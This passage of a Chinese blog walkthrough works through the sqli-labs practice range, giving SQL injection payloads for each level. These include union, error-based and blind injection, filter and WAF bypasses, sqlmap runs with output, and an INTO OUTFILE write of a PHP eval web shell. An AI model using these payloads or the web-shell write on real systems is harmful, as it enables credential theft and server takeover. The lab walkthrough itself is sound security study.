class="code"><pre><span class="line">?id&#x3D;1&#39;    #报错为：near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br><span class="line">?id&#x3D;1&#39;) --+    #成功闭合</span><br></pre></td></tr></table></figure><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>get字符型报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;    #报错为：near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br><span class="line">?id&#x3D;1&quot;) --+    #成功闭合</span><br></pre></td></tr></table></figure><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>get字符型双注入</p><p>构造双查询，比如派生表，使一个报错，另一个的结果就会出现在报错的信息中。 </p><ul><li>手工注入</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">?id&#x3D;-1&#39;union select count(*),count(*), concat(&#39;~&#39;,(select database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line">或者</span><br><span class="line">?id&#x3D;-1&#39;union select count(*),1, concat(&#39;~&#39;,(select database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line">爆用户</span><br><span class="line">?id&#x3D;-1&#39; union select count(*),1, concat(&#39;~&#39;,(select user()),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line">爆表名</span><br><span class="line">修改limit x,1 可以遍历表名，找到user这个表，猜测它存放username和password</span><br><span class="line">?id&#x3D;-1&#39; union select count(*),1, concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line">爆字段</span><br><span class="line">修改limit x,1 可以遍历列名，找到username和password列</span><br><span class="line">?id&#x3D;-1&#39; union select count(*),1, concat(&#39;~&#39;,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line">爆值</span><br><span class="line">修改limit x,1 可以显示第x个用户的password和username  （‘[’是分隔符）</span><br><span class="line">?id&#x3D;-1&#39; union select count(*),1, concat(&#39;~&#39;,(select concat_ws(&#39;[&#39;,password,username) from users limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><ul><li>sqlmap注入</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.1.5:86&#x2F;Less-5&#x2F;?id&#x3D;1&quot; --current-db --dbms&#x3D;mysql --threads&#x3D;10 --batch</span><br><span class="line">结果</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 8616&#x3D;8616 AND &#39;IoWT&#39;&#x3D;&#39;IoWT</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 1410 FROM(SELECT COUNT(*),CONCAT(0x71627a7171,(SELECT (ELT(1410&#x3D;1410,1))),0x7176787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#39;Yobg&#39;&#x3D;&#39;Yobg</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 5692 FROM (SELECT(SLEEP(5)))yEOF) AND &#39;SKCw&#39;&#x3D;&#39;SKCw</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>get字符型双注入</p><p>如Less-5,这里单引号改为双引号闭合</p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>get字符型导入导出文件注入</p><ul><li><p>参考：<a href="https://www.jianshu.com/p/7b9256de20d1" target="_blank" rel="noopener">https://www.jianshu.com/p/7b9256de20d1</a> </p></li><li><p>读写条件</p></li></ul><p>mysql中my.ini文件修改</p><p><code>secure_file_priv=&quot;&quot;</code>   可导入</p><p><code>general_log = on</code>  可写</p><ul><li>路径</li></ul><p>winserver的iis默认路径c:\Inetpub\wwwroot<br>linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等<br>apache 就…/var/www/htm，…/var/www/html/htdocs<br>phpstudy 就是…\phpstudy_pro\WWW<br>xammp 就是…\xampp\htdocs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;))  UNION SELECT 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39;  into outfile &quot;D:\\phpstudy_pro\\WWW\\1.php&quot; --+</span><br></pre></td></tr></table></figure><p>浏览器测试是否导入成功（直接查看 ）</p><p>若导入成功，菜刀连接</p><ul><li>sqlmap注入</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.1.5:86&#x2F;Less-7&#x2F;?id&#x3D;1&quot; --batch --current-db --threads&#x3D;10</span><br><span class="line">结果</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39;) AND 2123&#x3D;2123 AND (&#39;klSO&#39;&#x3D;&#39;klSO</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39;) AND (SELECT 3973 FROM (SELECT(SLEEP(5)))otYf) AND (&#39;PIvC&#39;&#x3D;&#39;PIvC</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>get字符型布尔盲注</p><ul><li>手工注入</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">单引号闭合</span><br><span class="line">?id&#x3D;1&#39; --+</span><br><span class="line">测试出库名的长度，同理测出表名长度，段名长度等</span><br><span class="line">?id&#x3D;1&#39; and length(database())&#x3D;8 --+</span><br><span class="line">测试出库名</span><br><span class="line">?id&#x3D;1&#39; and left((select database()),1)&#x3D;&#39;s&#39; --+</span><br><span class="line">?id&#x3D;1&#39; and left((select database()),8)&#x3D;&#39;security&#39; --+</span><br><span class="line">测试出表名</span><br><span class="line">?id&#x3D;1&#39; and left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;&#39;r&#39; --+</span><br><span class="line">测试出段名</span><br><span class="line">?id&#x3D;1&#39; and left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),8)&#x3D;&#39;password&#39; --+</span><br><span class="line">测试出password和username值</span><br><span class="line">?id&#x3D;1&#39; and left((select password from users order by id limit 0,1),1)&#x3D;&#39;a&#39; --+</span><br><span class="line">?id&#x3D;1&#39; and left((select username from users order by id limit 0,1),1)&#x3D;&#39;a&#39; --+</span><br></pre></td></tr></table></figure><ul><li>sqlmap注入</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">暴库</span><br><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.1.5:86&#x2F;Less-8&#x2F;?id&#x3D;1&quot; --dbms&#x3D;mysql --technique&#x3D;B --threads&#x3D;10 --batch --current-db</span><br></pre></td></tr></table></figure><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>get字符型时间盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">数据库长</span><br><span class="line">?id&#x3D;1&#39; and if (length(database())&#x3D;8,sleep(3),1)--+</span><br><span class="line">暴库名</span><br><span class="line">?id&#x3D;1&#39; and if(ascii(stustr(database(),1,1))&#x3D;115,1,sleep(3)) --+</span><br></pre></td></tr></table></figure><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>get字符型时间盲注</p><ul><li>手工注入</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">数据库长</span><br><span class="line">?id&#x3D;1&quot; and if (length(database())&#x3D;8,sleep(3),1)--+</span><br><span class="line">暴库名</span><br><span class="line">?id&#x3D;1&quot; and if(ascii(stustr(database(),1,1))&#x3D;115,1,sleep(3)) --+</span><br></pre></td></tr></table></figure><ul><li>sqlmap注入</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.1.5:86&#x2F;Less-10&#x2F;?id&#x3D;1&quot; --dbms&#x3D;mysql --technique&#x3D;T --threads&#x3D;10 --batch --current-db --level 2 --time-sec&#x3D;2</span><br></pre></td></tr></table></figure><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>post字符型报错注入</p><ul><li>手工注入</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注入点</span><br><span class="line">uname&#x3D;123&#39; or 1&#x3D;1 %23 &amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br><span class="line">数据库名</span><br><span class="line">uname&#x3D;123&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) %23 &amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p>post字符型报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">uname&#x3D;123&quot;  and updatexml(1,concat(0x7e,database(),0x7e),1) and &quot;&amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p>post字符型双注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">uname&#x3D;123&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39; &amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>post字符型双注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">uname&#x3D;123&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &quot;&amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>post字符型 时间/布尔 盲注</p><p>布尔盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;and length(database())&#x3D;8 %23 &amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p>时间盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;and if(length(database())&#x3D;8,sleep(3),1) %23 &amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>post字符型 时间/布尔 盲注</p><p>如less-15，这里”)闭合</p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>post字符型 报错/更新查询 注入</p><p>uname需要是已存在的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">暴库</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) %23&amp;submit&#x3D;Submit</span><br><span class="line">爆表名</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1) %23&amp;submit&#x3D;Submit</span><br><span class="line">爆字段名</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; and table_schema&#x3D;database()),0x7e),1) %23&amp;submit&#x3D;Submit</span><br><span class="line">爆字段值,limit处修改x查看下一行</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;123&#39; and updatexml(1,concat(0x7e,(select password from (select password from security.users limit x,1 ) bieming ),0x7e),1) %23&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>post字符型报错注入</p><p>burp抓包</p><p>admin,admin成功登录并修改User-Agent</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">暴库</span><br><span class="line">User-Agent: &#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &#39;</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>post字符型报错注入</p><p>burp抓包,admin,admin成功登录并修改referer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Referer:&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &#39;</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>post字符型报错注入</p><p>admin,admin成功登录后，burp抓包，修改cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname&#x3D;admin&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &#39;</span><br></pre></td></tr></table></figure><h2 id="Page-2"><a href="#Page-2" class="headerlink" title="Page-2"></a>Page-2</h2><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><p>cookie注入，base64加密，单引号圆括号闭合</p><p>admin,admin成功登录后，burp抓包</p><p>cookie处<code>YWRtaW4%3D</code>也就是<code>YWRtaW4=</code>,再base64解密，结果admin </p><p>构造 <code>admin&#39;) and updatexml(1,concat(0x7e,(database()),0x7e),1) and (&#39;</code> </p><p>再base64加密<code>YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAoJw==</code></p><p>修改Cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">Cookie: uname&#x3D;YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAoJw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><p>cookie注入，base64加密，双引号</p><p>与less-21相同，修改为双引号闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname&#x3D;YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoZGF0YWJhc2UoKSksMHg3ZSksMSkgYW5kICI&#x3D;</span><br></pre></td></tr></table></figure><h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>get报错注入，绕过注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">闭合</span><br><span class="line">?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">爆库</span><br><span class="line">?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &#39;</span><br></pre></td></tr></table></figure><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>二次注入</p><p>创建一个<code>admin&#39;#</code>账户</p><p>登陆后修改密码，Password successfully updated ，记住修改后的密码</p><p>之后即可使用admin用户登录</p><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><p>and,or,注释过滤</p><p>双写绕过，information里的or也双写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">闭合</span><br><span class="line">?id&#x3D;1&#39; anandd &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">爆库</span><br><span class="line">?id&#x3D;1&#39; anandd updatexml(1,concat(0x7e,(database()),0x7e),1) anandd &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><p>空格，and，注释过滤</p><p>and双写绕过，information里的or也双写，空格用以下编码绕过</p><p>%09 TAB键（水平）</p><p>%0a 新建一行</p><p>%0c 新的一页</p><p>%0d return功能</p><p>%0b TAB键（垂直）</p><p>%a0 空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">闭合</span><br><span class="line">?id&#x3D;1&#39; anandd &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">爆库</span><br><span class="line">?id&#x3D;1&#39;anandd %a0 updatexml(1,concat(0x7e,(database()),0x7e),1) %a0 anandd &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><p>union,select,空格过滤</p><p>空格绕过同less-26, select大小写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">闭合</span><br><span class="line">?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">爆库</span><br><span class="line">?id&#x3D;1&#39; and %a0 updatexml(1,concat(0x7e,(database()),0x7e),1) %a0 and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">爆表</span><br><span class="line">?id&#x3D;1&#39; and %a0 updatexml(1,concat(0x7e,(SeLect %a0 group_concat(table_name) from %0a information_schema.tables %a0 where %a0 table_schema&#x3D;database()),0x7e),1) %a0 and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><p>union,select，空格过滤</p><p>大小写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">闭合</span><br><span class="line">?id&#x3D;1&#39;) and (&#39;1&#39;)&#x3D;(&#39;1</span><br><span class="line">爆库</span><br><span class="line">?id&#x3D;0&#39;)  %a0 Union %a0 SelEct %a0 1,database(),3 %a0and (&#39;1&#39;)&#x3D;(&#39;1</span><br><span class="line">爆表名</span><br><span class="line">?id&#x3D;0&#39;)  %a0 Union %a0 SelEct %a0 1,group_concat(table_name) ,3%a0 from %a0 information_schema.tables %a0 where %a0 table_schema&#x3D;database() %a0and (&#39;1&#39;)&#x3D;(&#39;1</span><br><span class="line">爆字段名</span><br><span class="line">?id&#x3D;0&#39;)  %a0 Union %a0 SelEct %a0 1,group_concat(column_name)  ,3%a0 from %a0 information_schema.columns %a0 where %a0 table_name&#x3D;&quot;users&quot; and  %a0 table_schema&#x3D;database() %a0and (&#39;1&#39;)&#x3D;(&#39;1</span><br><span class="line">爆字段值</span><br><span class="line">?id&#x3D;0&#39;) UNion %a0 SElect %a0 1,(group_concat(username,0x3a,password)),3 %a0 from %a0 security.users %a0 where %a0 1 %a0 and %a0 (&#39;1&#39;)&#x3D;(&#39;1</span><br></pre></td></tr></table></figure><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><p>有waf,…emmm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">爆表</span><br><span class="line">?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(seLect group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1) and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">爆字段名</span><br><span class="line">?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(seLect group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;users&quot;),0x7e),1) and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">爆字段值,显示长度受限，配合substr()</span><br><span class="line">?id&#x3D;1&#39; and updatexml(1,substr(concat(0x7e,(seLect group_concat(username,0x3a,password) from security.users),0x7e),1,24),1) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><p>有waf,…..emmm，同less-29，换双引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">闭合</span><br><span class="line">?id&#x3D;1&quot; and &quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure><h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h3><p>有waf，同less-29，换双引号，想体验过waf,就自己加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">闭合</span><br><span class="line">?id&#x3D;1&quot;) and (&quot;1&quot;)&#x3D;(&quot;1</span><br></pre></td></tr></table></figure><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>引号过滤</p><p>宽字节绕过,users转为hex</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">?id&#x3D;1%e6&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1)  %23</span><br></pre></td></tr></table></figure><h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><p>同less-32</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">?id&#x3D;1%e6&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1)  %23</span><br></pre></td></tr></table></figure><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>post,其他同less-32</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">uname&#x3D;admin%e6&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1)  %23&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><p>get整形报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">?id&#x3D;1 and updatexml(1,concat(0x7e,(database()),0x7e),1)</span><br></pre></td></tr></table></figure><h2 id="Page-3"><a href="#Page-3" class="headerlink" title="Page-3"></a>Page-3</h2><h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">闭合</span><br><span class="line">?id&#x3D;1&#39; %23</span><br><span class="line">爆库</span><br><span class="line">?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) %23</span><br></pre></td></tr></table></figure><p>…没发现第三页的新鲜玩意，直接跳到第四页，谁发现留言一哈</p><h2 id="Page-4"><a href="#Page-4" class="headerlink" title="Page-4"></a>Page-4</h2><p>次数限制为10次，像ctf,还要提交key</p><h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><p>9次才爆了个库，表名是变化的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">闭合</span><br><span class="line">?id&#x3D;1&#39; %23</span><br><span class="line">爆库和表</span><br><span class="line">?id&#x3D;0&#39; UnIon SelEct 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() %23</span><br><span class="line">------</span><br><span class="line">Your Login name:challenges</span><br><span class="line">Your Password:qmwp03yike</span><br><span class="line">------</span><br><span class="line">爆字段名</span><br><span class="line">?id&#x3D;0&#39; UnIon SelEct 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;&quot; %23</span><br><span class="line">------</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:id,sessid,secret_L8D3,tryy</span><br><span class="line">------</span><br><span class="line">爆字段值</span><br><span class="line">太菜了，没爆出来，休息一下再来</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
